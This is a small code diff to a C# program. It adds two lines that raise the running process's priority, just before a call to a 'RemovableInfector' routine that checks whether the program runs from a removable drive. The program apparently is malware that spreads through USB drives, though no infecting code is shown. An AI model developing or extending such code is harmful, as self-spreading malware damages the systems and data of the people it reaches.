@@ -18,6 +18,9 @@ namespace zort
 
         static void Main(string[] args)
         {
+            var process = Process.GetCurrentProcess();
+            process.PriorityClass = ProcessPriorityClass.AboveNormal;
+
             try
             {
                 RemovableInfector.CheckIfRunningFromRemovableDrive();
